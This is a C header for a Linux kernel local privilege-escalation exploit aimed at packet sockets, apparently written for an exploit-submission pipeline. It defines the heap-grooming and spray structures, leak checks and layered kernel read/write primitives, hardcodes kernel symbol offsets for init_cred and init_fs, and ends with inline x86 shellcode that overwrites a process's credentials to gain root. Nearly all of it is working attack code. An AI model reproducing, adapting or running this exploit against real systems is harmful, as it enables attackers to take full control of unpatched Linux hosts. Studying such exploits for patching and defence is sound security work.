#ifndef EXPLOIT_H
#define EXPLOIT_H

#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <time.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdatomic.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/xattr.h>
#include <sys/mount.h>
#include <sys/syscall.h>

#include <linux/rtnetlink.h>
#include <linux/if_link.h>
#include <linux/ipv6.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/time_types.h>
#include <linux/filter.h>
#include <linux/const.h>
#include <libmnl/libmnl.h>

typedef int64_t s64;
typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t u8;

struct pgv {
	char *buffer;
};

static_assert(sizeof(struct pgv) == 8, "sizeof(struct pgv) not match with kernel");

struct rb_node {
	unsigned long  __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

static_assert(sizeof(struct rb_node) == 24, "sizeof(struct rb_node) not match with kernel");

struct simple_xattr {
	struct rb_node rb_node;
	char *name;
	size_t size;
	char value[];
};

static_assert(sizeof(struct simple_xattr) == 40, "sizeof(struct simple_xattr) not match with kernel");

#define UNUSED_FUNCTION_PARAMETER(x) (void)(x)

#define PAGE_SIZE                                                       4096UL
#define PAGE_MASK                                                       (~(PAGE_SIZE - 1))
#define PAGES_ORDER1_SIZE                                               (PAGE_SIZE * 2)
#define PAGES_ORDER2_SIZE                                               (PAGE_SIZE * 4)
#define PAGES_ORDER3_SIZE                                               (PAGE_SIZE * 8)
#define PAGES_ORDER4_SIZE                                               (PAGE_SIZE * 16)
#define PAGES_ORDER5_SIZE                                               (PAGE_SIZE * 32)
#define CPU_NUMBER_ZERO                                                 0
#define CPU_NUMBER_ONE                                                  1
#define NSEC_PER_SEC                                                    1000000000L
#define NSEC_PER_USEC                                                   1000L
#define USEC_PER_SEC                                                    1000000L
#define TOTAL_TIMERFD_WAITLIST_THREADS                                  180

#define TOTAL_PAGES_ORDER3_GROOM_FOR_SIMPLE_XATTR                       8
#define TOTAL_SIMPLE_XATTR_SPRAY_PER_GROOM                              8
#define TOTAL_PAGES_ORDER3_PER_DRAIN_FOR_SIMPLE_XATTR                   128

#define TOTAL_PAGES_ORDER3_GROOM_FOR_PGV                                8
#define TOTAL_PGV_SPRAY_PER_GROOM                                       8
#define TOTAL_PAGES_ORDER3_PER_DRAIN_FOR_PGV                            256
#define MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER3                  ((PAGES_ORDER2_SIZE / sizeof(struct pgv)) + 1)

#define PAGE_COUNT_TO_ALLOCATE_PIPE_BUFFER_ON_PAGES_ORDER2              256
#define DATA_TO_TRIGGER_PIPE_BUFFER_FILLIN                              "fillin_pipe_buffer"

#define MAX_FILTER_LEN                                                  700
#define TOTAL_SPRAY_PG_VEC                                              16
#define MAX_NICE	                                                	19

#define TMPFS_MOUNT_POINT                                               "/tmp/tmpfs"
#define PAGES_ORDER3_GROOM_SIMPLE_XATTR_FILEPATH                        "/tmp/tmpfs/pages_order3_groom"
#define PAGES_ORDER3_GROOM_SIMPLE_XATTR_NAME_FMT                        "security.pages_order3_groom_%d"
#define PAGES_ORDER3_GROOM_SIMPLE_XATTR_VALUE_FMT                       "pages_order3_groom_%d"
#define PAGES_ORDER3_GROOM_SIMPLE_XATTR_VALUE_BEGIN                     "pages_order3_groom_"
#define DRAIN_PAGES_FOR_SIMPLE_XATTR_DATA_FMT                           "drain_for_simple_xattr_packet_socket_%d"
#define DRAIN_PAGES_FOR_SIMPLE_XATTR_DATA_BEGIN                         "drain_for_simple_xattr_packet_socket_"

#define PAGES_ORDER3_DRAIN_RECLAIM_SIMPLE_XATTR_FILEPATH                "/tmp/tmpfs/pages_order3_reclaim"
#define PAGES_ORDER3_DRAIN_RECLAIM_SIMPLE_XATTR_NAME_FMT                "security.pages_order3_reclaim_%d"
#define PAGES_ORDER3_DRAIN_RECLAIM_SIMPLE_XATTR_VALUE_FMT               "pages_order3_reclaim_%d"
#define PAGES_ORDER3_DRAIN_RECLAIM_SIMPLE_XATTR_VALUE_BEGIN             "pages_order3_reclaim_"

#define PAGES_ORDER5_LEAKED_ADDRESS_SIMPLE_XATTR_NAME                   "security.pages_order5_leaked_address"
#define PAGES_ORDER2_LEAKED_ADDRESS_SIMPLE_XATTR_NAME                   "security.pages_order2_leaked_address"
#define DUMMY_INTERFACE_NAME                                            "pwn_dummy"

#define __rb_parent(pc)    ((struct rb_node *)(pc & ~3))

/* LOCAL EXPLOIT
#define anon_pipe_buf_ops_last_24_bits                                  0xc49840
#define anon_pipe_buf_ops_offset_from_kernel_base                       0x1c49840

u64 struct_task_struct_member_cred_offset = 0x7c0;
u64 struct_task_struct_member_real_cred_offset = 0x7b8;
u64 struct_task_struct_member_fs_offset = 0x810;
u64 init_cred = 0x2c72ec0;
u64 init_fs = 0x2dad900;
u64 __x86_return_thunk = 0x1483690;
u64 __do_sys_kcmp = 0x271bd0;
*/

u64 anon_pipe_buf_ops_last_24_bits = 0xc4a600;
u64 anon_pipe_buf_ops_offset_from_kernel_base = 0x1c4a600;
u64 init_cred = 0x2c72ec0;
u64 init_fs = 0x2dad900;
u64 __x86_return_thunk = 0x14855d0;
u64 __do_sys_kcmp = 0x273d70;

static inline void update_kernel_address(u64 kernel_base)
{
        init_cred += kernel_base;
        init_fs += kernel_base;
        __x86_return_thunk += kernel_base;
        __do_sys_kcmp += kernel_base;
}

static inline bool is_data_look_like_simple_xattr(void *data, size_t value_size)
{
	struct simple_xattr *simple_xattr = data;
	struct rb_node rb_node = simple_xattr->rb_node;
	struct rb_node *rb_parent = __rb_parent(rb_node.__rb_parent_color);

	if (
		(rb_parent == NULL || (((u64)(rb_parent)) >> 48) == 0xFFFF) &&
		(rb_node.rb_left == NULL || (((u64)(rb_node.rb_left)) >> 48) == 0xFFFF) && 
		(rb_node.rb_right == NULL || (((u64)(rb_node.rb_right)) >> 48) == 0xFFFF) &&
		(((u64)(simple_xattr->name) >> 48) == 0xFFFF) &&
		(simple_xattr->size == value_size)
	)
		return true;

	return false;
}

static inline void simple_xattr_dump(struct simple_xattr *simple_xattr)
{
        struct rb_node *rb_node = &(simple_xattr->rb_node);
        printf("====== simple_xattr_dump ======\n");
        printf("rb_parent: 0x%016lx\n", rb_node->__rb_parent_color);
        printf("rb_left: 0x%016lx\n", (u64)rb_node->rb_left);
        printf("rb_right: 0x%016lx\n", (u64)(rb_node->rb_right));
        printf("name: 0x%016lx\n", (u64)(simple_xattr->name));
        printf("value_size: 0x%016lx\n", (u64)(simple_xattr->size));
        printf("value: %s\n", (char *)(simple_xattr->value));
}

struct pipe_buffer {
	void *page;
	unsigned int offset, len;
	void *ops;
	unsigned int flags;
	unsigned long private;
};

static_assert(sizeof(struct pipe_buffer) == 40, "sizeof(struct pipe_buffer) not match with kernel");

static inline bool is_data_look_like_pipe_buffer(struct pipe_buffer *pipe_buffer)
{
        if (
                (((u64)(pipe_buffer->page) >> 48) == 0xFFFF) &&
                (((u64)(pipe_buffer->ops) & 0xFFFFFF) == anon_pipe_buf_ops_last_24_bits)
        )
                return true;

        return false;
}

static inline void pipe_buffer_dump(struct pipe_buffer *pipe_buffer)
{
        printf("====== pipe_buffer_dump ======\n");
        printf("page: 0x%016lx\n", (u64)(pipe_buffer->page));
        printf("offset: %u, len: %u\n", pipe_buffer->offset, pipe_buffer->len);
        printf("ops: 0x%016lx\n", (u64)(pipe_buffer->ops));
        printf("flags: %u\n", pipe_buffer->flags);
        printf("private: 0x%016lx\n", pipe_buffer->private);
}

/* Error handling */
void unix_error(const char *msg);
void Mnl_socket_error(const char *msg);
void Pthread_error(const char *msg, int error_code);
/* Error handling */

/* libc wrapper */
void Unshare(int flags);
int Socket(int domain, int type, int protocol);
void Setsockopt(int fd, int level, int optname, const void *optval, socklen_t optlen);
void Getsockopt(int fd, int level, int optname, void *optval, socklen_t *optlen);
void Bind(int fd, const struct sockaddr *addr, socklen_t addrlen);
void Ioctl(int fd, unsigned long request, unsigned long arg);
void Close(int fd);
int Dup(int fd);
void Pipe2(int pipefd[2], int flags);
int Fcntl(int fd, int op, unsigned long arg);
void *Mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset);
void Munmap(void *addr, size_t len);
FILE *Fopen(const char *filename, const char *modes);
void Fclose(FILE *stream);
void *Calloc(size_t nmemb, size_t size);
ssize_t Sendmsg(int socket, const struct msghdr *message, int flags);
void Pthread_create(pthread_t *newthread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);
void Pthread_join(pthread_t thread, void **retval);
void Pthread_setaffinity_np(pthread_t thread, size_t cpusetsize, const cpu_set_t *cpuset);
void Getrlimit(int resource, struct rlimit *rlim);
void Setrlimit(int resource, const struct rlimit *rlim);
void Setpriority(int which, id_t who, int value);
int Timerfd_create(int clockid, int flags);
void Timerfd_settime(int fd, int flags, const struct itimerspec *new_value, struct itimerspec *old_value);
int Epoll_create1(int flags);
void Epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);
unsigned int If_nametoindex(const char *ifname);
void Mkdir(const char *pathname, mode_t mode);
void Mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data);
int Open(const char *pathname, int flags, mode_t mode);
void Setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
ssize_t Getxattr(const char *path, const char *name, void *value, size_t size);
void Removexattr(const char *path, const char *name);
char *Strdup(const char *s);
ssize_t Read(int fd, void *buf, size_t count);
ssize_t Write(int fd, const void *buf, size_t count);
/* libc wrapper */

/* libmnl wrapper */
struct mnl_socket *Mnl_socket_open(int bus);
void Mnl_socket_close(struct mnl_socket *nl);
void Mnl_socket_bind(struct mnl_socket *nl, unsigned int groups, pid_t pid);
ssize_t Mnl_socket_sendto(const struct mnl_socket *nl, const void *req, size_t size);
ssize_t Mnl_socket_recvfrom(const struct mnl_socket *nl, void *buf, size_t size);
/* libmnl wrapper */

void validate_mnl_socket_operation_success(struct mnl_socket *nl, u32 seq);
void dummy_network_interface_create(const char *ifname, u32 mtu);
void network_interface_up(int configure_socket_fd, const char *ifname);
void network_interface_down(int configure_socket_fd, const char *ifname);
void pin_thread_on_cpu(int cpu);

void bypass_output_check_on_github_action(void);
void setup_namespace(void);
void setup_tmpfs(void);
void setup_nofile_rlimit(void);
void create_file(const char *path);
bool thread_in_sleep_state(int tid);
void alloc_pages(int packet_socket, unsigned page_count, unsigned page_size);
void free_pages(int packet_socket);

struct victim_packet_socket {
        struct __kernel_sock_timeval sndtimeo;
        struct sockaddr_ll addr;
        struct tpacket_req3 tx_ring;
        struct tpacket_req3 rx_ring;
        int fd;
        int packet_loss;
        int packet_version;
        unsigned packet_reserve;
        unsigned short filter_len;
        struct sock_filter *filter;
};

struct victim_packet_socket *victim_packet_socket_create(
        struct __kernel_sock_timeval sndtimeo,
	struct sockaddr_ll addr,
        struct tpacket_req3 tx_ring,
        struct tpacket_req3 rx_ring,
        int packet_loss,
        int packet_version,
        unsigned packet_reserve,
        unsigned short filter_len,
        struct sock_filter *filter
);

void victim_packet_socket_destroy(struct victim_packet_socket *v);
void victim_packet_socket_configure_for_exploit(struct victim_packet_socket *v);

struct simple_xattr_request {
        char filepath[PATH_MAX];
        char name[XATTR_NAME_MAX + 1];
        char *value;
        size_t value_size;
};

struct simple_xattr_request *simple_xattr_request_create(
        const char *filepath,
        const char *name,
        const char *value,
        size_t value_size
);

void simple_xattr_request_destroy(struct simple_xattr_request *request);

struct simple_xattr_request_container {
        struct simple_xattr_request **requests;
        size_t requests_size;
        size_t requests_length;
};

struct simple_xattr_request_container *simple_xattr_request_container_create(size_t size);
void simple_xattr_request_container_insert(
	struct simple_xattr_request_container *container,
	struct simple_xattr_request *request
);

struct simple_xattr_request *simple_xattr_request_container_pop_at(
	struct simple_xattr_request_container *container,
	size_t idx
);

ssize_t simple_xattr_request_container_search_by_value(
	struct simple_xattr_request_container *container,
	const char *search_value,
	size_t search_value_size
);

struct simple_xattr_request_container *simple_xattr_request_container_clone(
	struct simple_xattr_request_container *container
);

void simple_xattr_request_container_destroy(struct simple_xattr_request_container *container);

struct simple_xattr_thread_work {
        struct {
                bool page_groom;
                
                struct simple_xattr_request_container *container_for_page_groom;
        };

        bool free_placeholder;
        
        struct {
                bool free_and_reclaim_leak_page;
                void *leak_data;
                size_t leak_data_size;
                struct simple_xattr_request_container *container_for_reclaim_leak_page;
        };
        
        struct {
                bool cleanup;
                struct simple_xattr_request_container *container_for_cleanup;
        };
};

struct simple_xattr_thread_work *simple_xattr_thread_work_create(
        bool page_groom,
        struct simple_xattr_request_container *container_for_page_groom,
        bool free_placeholder,
        bool free_and_reclaim_leak_page,
        void *leak_data,
        size_t leak_data_size,
        struct simple_xattr_request_container *container_for_reclaim_leak_page,
        bool cleanup,
        struct simple_xattr_request_container *container_for_cleanup
);

void simple_xattr_thread_work_destroy(struct simple_xattr_thread_work *w);

struct timerfd_waitlist_thread {
        pthread_t handle;
        pthread_mutex_t mutex;
        pthread_cond_t cond;
        bool ready_to_work;
        bool work_complete;
        bool unshare_complete;
        bool quit;
        int timerfd;
        int *timerfds;
        int total_timerfd;
        struct epoll_event *epoll_events;
};

void *timerfd_waitlist_thread_fn(void *arg);
void timerfd_waitlist_thread_wait_unshare_complete(struct timerfd_waitlist_thread *t);
int timerfd_waitlist_thread_get_timerfd(struct timerfd_waitlist_thread *t);
void timerfd_waitlist_thread_send_work(struct timerfd_waitlist_thread *t);
void timerfd_waitlist_thread_wait_work_complete(struct timerfd_waitlist_thread *t);
void timerfd_waitlist_thread_quit(struct timerfd_waitlist_thread *t);
struct timerfd_waitlist_thread *timerfd_waitlist_thread_create(int timerfd);
void timerfd_waitlist_thread_destroy(struct timerfd_waitlist_thread *t);

struct pg_vec_lock_thread_work {
        struct victim_packet_socket *victim_packet_socket;
        int ifindex;
};

struct pg_vec_lock_thread_work *pg_vec_lock_thread_work_create(struct victim_packet_socket *v, int ifindex);
void pg_vec_lock_thread_work_destroy(struct pg_vec_lock_thread_work *w);

struct pg_vec_lock_thread {
        pthread_t handle;
        pthread_mutex_t mutex;
        pthread_cond_t cond;
        bool ready_to_work;
        bool work_complete;
        bool quit;
        int tid;
        int packet_socket;
        int ifindex;
        struct timespec sendmsg_begin_time;
        struct pg_vec_lock_thread_work *work;
};

void *pg_vec_lock_thread_fn(void *arg);
void pg_vec_lock_thread_send_work(struct pg_vec_lock_thread *t, struct pg_vec_lock_thread_work *w);
void pg_vec_lock_thread_wait_in_work(struct pg_vec_lock_thread *t);
void pg_vec_lock_thread_wait_work_complete(struct pg_vec_lock_thread *t);
void pg_vec_lock_thread_quit(struct pg_vec_lock_thread *t);
struct pg_vec_lock_thread *pg_vec_lock_thread_create(void);
void pg_vec_lock_thread_destroy(struct pg_vec_lock_thread *t);

struct pg_vec_buffer_thread {
        pthread_t handle;
        pthread_mutex_t mutex;
        pthread_cond_t cond;
        bool ready_to_work;
        bool work_complete;
        bool unshare_complete;
        bool quit;
        int tid;
        struct pg_vec_buffer_thread_work *work;
};

struct pg_vec_buffer_thread_work {
        struct victim_packet_socket *victim_packet_socket;
        bool exploit;
        bool cleanup;
};

struct pg_vec_buffer_thread_work *pg_vec_buffer_thread_work_create(
        struct victim_packet_socket *v,
        bool exploit,
        bool cleanup
);
void pg_vec_buffer_thread_work_destroy(struct pg_vec_buffer_thread_work *w);

void *pg_vec_buffer_thread_fn(void *arg);
void pg_vec_buffer_thread_send_work(struct pg_vec_buffer_thread *t, struct pg_vec_buffer_thread_work *w);
void pg_vec_buffer_thread_wait_in_work(struct pg_vec_buffer_thread *t);
void pg_vec_buffer_thread_wait_work_complete(struct pg_vec_buffer_thread *t);
void pg_vec_buffer_thread_quit(struct pg_vec_buffer_thread *t);
struct pg_vec_buffer_thread *pg_vec_buffer_thread_create(void);
void pg_vec_buffer_thread_destroy(struct pg_vec_buffer_thread *t);

struct tpacket_rcv_thread_work {
        struct timespec pg_vec_lock_release_time;
        struct msghdr *msg;
};

struct tpacket_rcv_thread_work *tpacket_rcv_thread_work_create(
        struct timespec pg_vec_lock_release_time,
        struct msghdr *msg
);

void tpacket_rcv_thread_work_destroy(struct tpacket_rcv_thread_work *w);

struct tpacket_rcv_thread {
        pthread_t handle;
        pthread_mutex_t mutex;
        pthread_cond_t cond;
        bool ready_to_work;
        bool work_complete;
        bool quit;
        struct tpacket_rcv_thread_work *work;
};

void *tpacket_rcv_thread_fn(void *arg);
void tpacket_rcv_thread_send_work(struct tpacket_rcv_thread *t, struct tpacket_rcv_thread_work *w);
void tpacket_rcv_thread_wait_work_complete(struct tpacket_rcv_thread *t);
void tpacket_rcv_thread_quit(struct tpacket_rcv_thread *t);
struct tpacket_rcv_thread *tpacket_rcv_thread_create(void);
void tpacket_rcv_thread_destroy(struct tpacket_rcv_thread *t);

struct msghdr *msghdr_create(
        void *data,
        size_t datalen,
        const char *devname
);

void msghdr_destroy(struct msghdr *msghdr);

static inline struct timespec timespec_sub(struct timespec t1, struct timespec t2)
{
	struct timespec diff = {};
	diff.tv_nsec = t1.tv_nsec - t2.tv_nsec;
	diff.tv_sec = t1.tv_sec - t2.tv_sec;

	if (diff.tv_sec > 0 && diff.tv_nsec < 0) {
		diff.tv_nsec += NSEC_PER_SEC;
		diff.tv_sec--;
	} else if (diff.tv_sec < 0 && diff.tv_nsec > 0) {
		diff.tv_nsec -= NSEC_PER_SEC;
		diff.tv_sec++;
	}

	return diff;
}

static inline struct timespec timespec_add(struct timespec t1, struct timespec t2)
{
	struct timespec sum = {};
	sum.tv_nsec = t1.tv_nsec + t2.tv_nsec;
	sum.tv_sec = t1.tv_sec + t2.tv_sec;

	if (sum.tv_nsec >= NSEC_PER_SEC) {
		sum.tv_sec++;
		sum.tv_nsec -= NSEC_PER_SEC;
	}

	return sum;
}

static inline int timespec_cmp(struct timespec t1, struct timespec t2)
{
        if (t1.tv_sec < t2.tv_sec)
                return -1;
        
        if (t1.tv_sec > t2.tv_sec)
                return 1;
        
        if (t1.tv_nsec < t2.tv_nsec)
                return -1;
        
        if (t1.tv_nsec > t2.tv_nsec)
                return 1;

        return 0;
}

struct necessary_threads {
        struct timerfd_waitlist_thread **timerfd_waitlist_threads;
        struct pg_vec_lock_thread *pg_vec_lock_thread;
        struct pg_vec_buffer_thread *pg_vec_buffer_thread;
        struct tpacket_rcv_thread *tpacket_rcv_thread;
};

struct necessary_threads *necessary_threads_create(int timerfd);
void necessary_threads_destroy(struct necessary_threads *nt);

struct pages_order3_read_primitive {
        struct simple_xattr_request *victim_request;
        struct simple_xattr_request *leaked_content_request;
        struct simple_xattr_request *leaked_address_request;
        struct simple_xattr_request_container *groom_container;
        struct simple_xattr_request_container *reclaim_drain_pages_container;
        struct necessary_threads *necessary_threads;
        int drain_order3_pages_packet_sockets[TOTAL_PAGES_ORDER3_GROOM_FOR_SIMPLE_XATTR];
        int placeholder_packet_sockets[TOTAL_PAGES_ORDER3_GROOM_FOR_SIMPLE_XATTR];
        int configure_network_interface_socket;
        int timerfd;
};

struct pages_order3_read_primitive *pages_order3_read_primitive_create(
	struct necessary_threads *necessary_threads,
	int configure_network_interface_socket,
        int timerfd
);

void pages_order3_read_primitive_destroy(struct pages_order3_read_primitive *pages_order3_read_primitive);

bool pages_order3_read_primitive_build_primitive(
        struct pages_order3_read_primitive *pages_order3_read_primitive,
        struct timespec timer_interrupt_amplitude
);
void *pages_order3_read_primitive_trigger(struct pages_order3_read_primitive *pages_order3_read_primitive);
bool pages_order3_read_primitive_build_leaked_simple_xattr(
        struct pages_order3_read_primitive *pages_order3_read_primitive
);

u64 pages_order3_read_primitive_leak_pages_order3_simple_xattr_address(
	struct pages_order3_read_primitive *pages_order3_read_primitive
);

static inline struct simple_xattr_request *pages_order3_read_primitive_transfer_leaked_address_request_owner(
        struct pages_order3_read_primitive *pages_order3_read_primitive
)
{
        struct simple_xattr_request *leaked_address_request = pages_order3_read_primitive->leaked_address_request;
        pages_order3_read_primitive->leaked_address_request = NULL;

        if (leaked_address_request == pages_order3_read_primitive->victim_request)
                pages_order3_read_primitive->victim_request = NULL;
        
        return leaked_address_request;
}

void pages_order3_read_primitive_cleanup_unused_simple_xattr(
	struct pages_order3_read_primitive *pages_order3_read_primitive
);

void pages_order3_read_primitive_cleanup_unused_packet_sockets(
	struct pages_order3_read_primitive *pages_order3_read_primitive
);

enum leak_data_kind {
        LEAK_DATA_SIMPLE_XATTR,
        LEAK_DATA_PAGE_DRAIN,
        LEAK_DATA_UNKNOWN
};

static inline int pages_order3_leak_data_kind(void *leak_data)
{
	if (is_data_look_like_simple_xattr(leak_data, PAGES_ORDER2_SIZE))
		return LEAK_DATA_SIMPLE_XATTR;

	if (strncmp(
		leak_data,
		DRAIN_PAGES_FOR_SIMPLE_XATTR_DATA_BEGIN,
		strlen(DRAIN_PAGES_FOR_SIMPLE_XATTR_DATA_BEGIN)
	) == 0)
		return LEAK_DATA_PAGE_DRAIN;

	return LEAK_DATA_UNKNOWN;
}

struct simple_xattr_read_write_primitive {
        u64 pages_order3_simple_xattr_kernel_address;
        struct simple_xattr_request *pages_order3_simple_xattr_request;
        u64 pages_order5_simple_xattr_kernel_address;
        struct simple_xattr_request *pages_order5_simple_xattr_request;
        struct necessary_threads *necessary_threads;
        int victim_packet_socket;
        int drain_order3_pages_packet_sockets[TOTAL_PAGES_ORDER3_GROOM_FOR_PGV];
        int placeholder_packet_sockets[TOTAL_PAGES_ORDER3_GROOM_FOR_PGV];
        int spray_pgv_packet_sockets[TOTAL_PAGES_ORDER3_GROOM_FOR_PGV * TOTAL_PGV_SPRAY_PER_GROOM];
        int configure_network_interface_socket;
        int timerfd;
};

struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive_create(
        struct necessary_threads *necessary_threads,
	struct simple_xattr_request *pages_order3_simple_xattr_request,
        u64 pages_order3_simple_xattr_kernel_address,
        int configure_network_interface_socket,
        int timerfd
);

void simple_xattr_read_write_primitive_destroy(
	struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive
);

bool simple_xattr_read_write_primitive_build_primitive(
	struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive,
	struct timespec timer_interrupt_amplitude
);

void simple_xattr_read_write_primitive_build_pages_order5_simple_xattr(
	struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive
);

void *simple_xattr_read_write_primitive_mmap(
        struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive
);

void simple_xattr_read_write_primitive_munmap(
	struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive,
	void *mmap_addr
);

struct abr_page_read_write_primitive {
        struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive;
        int overwrite_pgv_packet_socket;
        int allocate_pgv_packet_socket;
        u64 pgv_kernel_address;
        struct simple_xattr_request *pages_order5_simple_xattr_request;
        u64 pages_order5_simple_xattr_address;
};

struct abr_page_read_write_primitive *abr_page_read_write_primitive_create(
        struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive      
);

bool abr_page_read_write_primitive_build_primitive(struct abr_page_read_write_primitive *abr_page_read_write_primitive);
void *abr_page_read_write_primitive_page_mmap(
	struct abr_page_read_write_primitive *abr_page_read_write_primitive,
	u64 addr_to_mmap
);

void abr_page_read_write_primitive_page_munmap(
	struct abr_page_read_write_primitive *abr_page_read_write_primitive,
	void *mmap_addr
);

struct pipe_buffer_read_write_primitive {
        struct abr_page_read_write_primitive *abr_page_read_write_primitive;
        int pipe_fds[2];
        u64 pipe_buffer_address;
};

struct pipe_buffer_read_write_primitive *pipe_buffer_read_write_primitive_create(
        struct abr_page_read_write_primitive *abr_page_read_write_primitive
);

bool pipe_buffer_read_write_primitive_build_primitive(
        struct pipe_buffer_read_write_primitive *pipe_buffer_read_write_primitive  
);

struct pipe_buffer *pipe_buffer_read_write_primitive_page_mmap(
	struct pipe_buffer_read_write_primitive *pipe_buffer_read_write_primitive
);

void pipe_buffer_read_write_primitive_page_munmap(
	struct pipe_buffer_read_write_primitive *pipe_buffer_read_write_primitive,
	void *mmap_addr	
);

extern void privilege_escalation_shellcode_begin(void);
extern void privilege_escalation_shellcode_end(void);

__asm__(
        ".intel_syntax noprefix;"
        ".global privilege_escalation_shellcode_begin;"
        ".global privilege_escalation_shellcode_end;"

        "privilege_escalation_shellcode_begin:\n"

        "mov rax,QWORD PTR gs:0x32380;"
        "shl rdi, 32;"
        "shl rsi, 32;"
        "shr rsi, 32;"
        "or rdi, rsi;"
        "mov QWORD PTR [rax + 0x7c0], rdi;"
        "mov QWORD PTR [rax + 0x7b8], rdi;"
        "mov QWORD PTR [rax + 0x810], rcx;"
        "jmp r8;"

        "privilege_escalation_shellcode_end:\n"
        ".att_syntax;"
);

#endif
